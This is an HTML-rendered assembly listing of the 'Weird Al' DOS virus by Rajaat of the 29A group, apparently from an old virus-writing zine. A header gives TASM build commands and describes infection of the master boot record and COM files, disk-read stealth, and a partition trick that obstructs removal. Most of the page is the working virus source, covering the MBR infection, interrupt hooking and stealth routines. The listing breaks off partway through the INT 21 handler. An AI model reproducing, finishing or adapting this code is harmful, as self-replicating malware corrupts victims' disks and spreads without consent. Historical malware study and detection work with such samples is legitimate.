<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Boot-DOS.Rajaat.Weirdal - 29A_3.6_7.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;=====( Weird Al Virus by Rajaat / 29A )=======================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Virus name    : Weird Al</span><span class="sc0">
</span><span class="sc1">; Author        : Rajaat / 29A</span><span class="sc0">
</span><span class="sc1">; Origin        : United Kingdom, March 1998</span><span class="sc0">
</span><span class="sc1">; Compiling     : Using TASM</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                 TASM /M WEIRDAL</span><span class="sc0">
</span><span class="sc1">;                 TLINK /T WEIRDAL</span><span class="sc0">
</span><span class="sc1">; Targets       : MBR &amp; COM files</span><span class="sc0">
</span><span class="sc1">; Size          : 512 bytes</span><span class="sc0">
</span><span class="sc1">; Resident      : Yes, from MBR only (no TOM decrease)</span><span class="sc0">
</span><span class="sc1">; Polymorphic   : No</span><span class="sc0">
</span><span class="sc1">; Encrypted     : No</span><span class="sc0">
</span><span class="sc1">; Stealth       : MBR only, reads and write</span><span class="sc0">
</span><span class="sc1">; Tunneling     : Uses SFT to avoid some monitors</span><span class="sc0">
</span><span class="sc1">; Retrovirus    : Yes, it uses the recursive extended partition trick</span><span class="sc0">
</span><span class="sc1">; Antiheuristics: Not deliberately</span><span class="sc0">
</span><span class="sc1">; Peculiarities : Nothing, I think, it's been a little exercise for me</span><span class="sc0">
</span><span class="sc1">; Drawbacks     : Write me :-)</span><span class="sc0">
</span><span class="sc1">; Behaviour     : When an infected COM file is executed, the virus will try</span><span class="sc0">
</span><span class="sc1">;                 to immediately infect the MBR. If the virus already</span><span class="sc0">
</span><span class="sc1">;                 infected the MBR but is not resident yet, it will</span><span class="sc0">
</span><span class="sc1">;                 recognize itself by the two POP AX instructions at the</span><span class="sc0">
</span><span class="sc1">;                 start of the virus code. If the virus is resident the</span><span class="sc0">
</span><span class="sc1">;                 MBR stealth routine will take care and the MBR won't</span><span class="sc0">
</span><span class="sc1">;                 be re-infected. After that the virus simply returns</span><span class="sc0">
</span><span class="sc1">;                 control to the host. When started by booting from the</span><span class="sc0">
</span><span class="sc1">;                 MBR, the virus will load it's code starting from</span><span class="sc0">
</span><span class="sc1">;                 absolute sector 2, directly to the top of dos memory.</span><span class="sc0">
</span><span class="sc1">;                 The virus will then hook INT 13 and INT 2F. The virus</span><span class="sc0">
</span><span class="sc1">;                 will reload the MBR (which loads now the original one)</span><span class="sc0">
</span><span class="sc1">;                 and returns control to the normal boot process. The</span><span class="sc0">
</span><span class="sc1">;                 virus will reserve its memory when it gets its INT 2F</span><span class="sc0">
</span><span class="sc1">;                 handler called by IO.SYS. It will return the last free</span><span class="sc0">
</span><span class="sc1">;                 segment in DX and IO.SYS will make a memory block for</span><span class="sc0">
</span><span class="sc1">;                 the virus when it starts building the MCB chain. This</span><span class="sc0">
</span><span class="sc1">;                 way the top of dos memory won't be decreased as</span><span class="sc0">
</span><span class="sc1">;                 usually happens with boot sector viruses. Q also uses</span><span class="sc0">
</span><span class="sc1">;                 this routine. It's a feature built in DOS for Novell</span><span class="sc0">
</span><span class="sc1">;                 its Remote Program Loader (RPL) for diskless</span><span class="sc0">
</span><span class="sc1">;                 workstations. INT 13 has two functions in this virus.</span><span class="sc0">
</span><span class="sc1">;                 First, it will try to make detection and removal of</span><span class="sc0">
</span><span class="sc1">;                 the MBR infection somewhat more difficult by making it</span><span class="sc0">
</span><span class="sc1">;                 read/write stealth. Second, it will check if the UMB</span><span class="sc0">
</span><span class="sc1">;                 chain is set up by a memory manager. When this happens</span><span class="sc0">
</span><span class="sc1">;                 the virus will hook INT 21. When this is done, the</span><span class="sc0">
</span><span class="sc1">;                 virus will infect every COM file that is closed</span><span class="sc0">
</span><span class="sc1">;                 (copying/scanning) and executed. It will get the</span><span class="sc0">
</span><span class="sc1">;                 current System File Table (SFT) from the Dos Swappable</span><span class="sc0">
</span><span class="sc1">;                 Area (DSA, which I also use in the DSA viruses) and</span><span class="sc0">
</span><span class="sc1">;                 set the file mode to read/write. It will check if it</span><span class="sc0">
</span><span class="sc1">;                 is a valid COM file and if it hasn't been already</span><span class="sc0">
</span><span class="sc1">;                 infected. Cleaning this virus might be a bit of a</span><span class="sc0">
</span><span class="sc1">;                 hassle, since it isn't possible to boot from a floppy</span><span class="sc0">
</span><span class="sc1">;                 that has MS-DOS 4.0 or higher, because of the</span><span class="sc0">
</span><span class="sc1">;                 recursive extended partition and the wonderful</span><span class="sc0">
</span><span class="sc1">;                 implementation flaw in IO.SYS that handles assigning</span><span class="sc0">
</span><span class="sc1">;                 drive names to the partitions. Get IBMDOS or Caldera</span><span class="sc0">
</span><span class="sc1">;                 OpenDos (www.caldera.com) to boot from a floppy disk</span><span class="sc0">
</span><span class="sc1">;                 and get rid of this virus. Apart from these features,</span><span class="sc0">
</span><span class="sc1">;                 the virus ain't very remarkable, but was a nice</span><span class="sc0">
</span><span class="sc1">;                 programming exercise for me today.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                 It's unknown what this virus might do besides replicate :)</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">                                     </span><span class="sc1">; PeeWee Herman</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">                                           </span><span class="sc1">; Code starts here</span><span class="sc0">
</span><span class="sc9">.radix</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                                       </span><span class="sc1">; You know I *LOVE* radix 16</span><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">                                            </span><span class="sc1">; I don't shun 386 opcodes</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">                         </span><span class="sc1">; Doh!</span><span class="sc0">

</span><span class="sc5">main</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; Get PSP:0</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20cdh</span><span class="sc0">                    </span><span class="sc1">; Is it INT 20?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">com_entry</span><span class="sc0">                    </span><span class="sc1">; Yes, goto com_entry</span><span class="sc0">

</span><span class="sc1">;=====( MBR entrypoint )=======================================================</span><span class="sc0">

                </span><span class="sc6">cli</span><span class="sc0">                             </span><span class="sc1">; MBR code starts here</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; Initialise segments</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; and stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">7c00</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">                          </span><span class="sc1">; Get top of memory</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                        </span><span class="sc1">; Convert to segment</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">virus_paras</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc0">           </span><span class="sc1">; Substruct virus paras (and</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; UMB marker segment!)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0200</span><span class="sc4">+</span><span class="sc5">virus_sectors</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">                      </span><span class="sc1">; Read virus code to TOM</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_virus</span><span class="sc0">                </span><span class="sc1">; (Stupid labels)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">tom_ep</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">                            </span><span class="sc1">; Jump to virus code below TOM</span><span class="sc0">

</span><span class="sc5">tom_ep</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; Antiheuristic?</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2f</span><span class="sc4">-</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">old_2f</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Hook INT 2F</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_2f</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2f</span><span class="sc4">-</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">13</span><span class="sc4">-</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">old_13</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">; Hook INT 13</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_13</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">13</span><span class="sc4">-</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; Set INT 21 hooked state to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">old_21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; clean</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">; Read original MBR and</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7c00</span><span class="sc0">                     </span><span class="sc1">; continue regular boot (the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_mbr</span><span class="sc0">                   </span><span class="sc1">; read is handled by the virus</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; it's own stealth routine)</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;=====( COM file entrypoint )==================================================</span><span class="sc0">

</span><span class="sc5">com_entry</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_delta</span><span class="sc0">                  </span><span class="sc1">; Nothing new here</span><span class="sc0">
</span><span class="sc5">get_delta</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">get_delta</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_mbr</span><span class="sc0">                   </span><span class="sc1">; Read MBR</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">5858</span><span class="sc0">       </span><span class="sc1">; Already infected?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">mbr_infected</span><span class="sc0">                 </span><span class="sc1">; Yes, goto mbr_infected</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301</span><span class="sc0">                     </span><span class="sc1">; Infect MBR</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">main</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_mbr</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301</span><span class="sc4">+</span><span class="sc5">virus_sectors</span><span class="sc0">       </span><span class="sc1">; Write virus and original</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">; MBR to absolute sectors 2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_virus</span><span class="sc0">                </span><span class="sc1">; and 3</span><span class="sc0">

</span><span class="sc1">;=====( Return to COM host )===================================================</span><span class="sc0">

</span><span class="sc5">mbr_infected</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">host_bytes</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Restore original 4 bytes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">                      </span><span class="sc1">; and return to the host by</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                         </span><span class="sc1">; pushing 100h to the stack</span><span class="sc0">
                </span><span class="sc6">movsd</span><span class="sc0">                           </span><span class="sc1">; and doing a RET</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">read_mbr</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201</span><span class="sc0">                     </span><span class="sc1">; Multiple purpose routine</span><span class="sc0">
</span><span class="sc5">write_mbr</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">; for reading and writing</span><span class="sc0">
</span><span class="sc5">write_virus</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">                       </span><span class="sc1">; using INT 13</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;=====( INT 2F handler )=======================================================</span><span class="sc0">

</span><span class="sc5">reserve_memory</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">virus_paras</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Reserve memory for the</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">                            </span><span class="sc1">; virus (look story above)</span><span class="sc0">
</span><span class="sc5">new_2f</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">reserve_memory</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">''</span><span class="sc0">                          </span><span class="sc1">; Smile.</span><span class="sc0">

</span><span class="sc1">;=====( INT 13 handler )=======================================================</span><span class="sc0">

</span><span class="sc5">new_13</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RPL'</span><span class="sc0">                        </span><span class="sc1">; Check this out in DEBUG</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                        </span><span class="sc1">; don't we love antidebugging?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">                       </span><span class="sc1">; HD1?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">is_hd</span><span class="sc0">                        </span><span class="sc1">; Yes, goto is_hd</span><span class="sc0">
</span><span class="sc5">eoi_13</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ea</span><span class="sc0">                          </span><span class="sc1">; Bailout</span><span class="sc0">
</span><span class="sc5">old_13</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">is_hd</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1000</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; very filthy thing to get rid of a turbo</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; assembler problem (check if abs sector 1)</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">is_mbr</span><span class="sc0">       </span><span class="sc1">; Yes, it is the MBR they try to access</span><span class="sc0">
</span><span class="sc5">check_umb</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">9fff</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc12">'CS'</span><span class="sc0">        </span><span class="sc1">; UMB present?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_umb</span><span class="sc0">                      </span><span class="sc1">; No, let's wait</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">old_21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Already hooked?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_umb</span><span class="sc0">                      </span><span class="sc1">; Yes, bailout again</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">21</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">old_21</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; No, now hook INT 21</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_21</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">21</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">no_umb</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">eoi_13</span><span class="sc0">

</span><span class="sc5">is_mbr</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                        </span><span class="sc1">; Head 0?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">check_umb</span><span class="sc0">                   </span><span class="sc1">; No, it was not the MBR</span><span class="sc0">
                                                </span><span class="sc1">; after all :-p</span><span class="sc0">
</span><span class="sc1">;=====( MBR stealth routine )==================================================</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                        </span><span class="sc1">; Read?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">is_read</span><span class="sc0">                      </span><span class="sc1">; Yes, goto is_read</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0a</span><span class="sc0">                       </span><span class="sc1">; Long read?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">is_read</span><span class="sc0">                      </span><span class="sc1">; Yes, goto is_read</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                        </span><span class="sc1">; Write?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">eoi_13</span><span class="sc0">                      </span><span class="sc1">; No, goto end of INT 13</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                        </span><span class="sc1">; Yes, we change to write</span><span class="sc0">
</span><span class="sc5">is_read</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_sectors</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; Redirect to original MBR</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">eoi_13</span><span class="sc0">                      </span><span class="sc1">; and proceed with original</span><span class="sc0">
                                                </span><span class="sc1">; INT 13</span><span class="sc0">

</span><span class="sc1">;=====( INT 21 handler )=======================================================</span><span class="sc0">

</span><span class="sc5">new_21</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3e</span><span class="sc0">                       </span><span class="sc1">; Close file?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                   </span><span class="sc1">; Yes, goto close_file</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0">
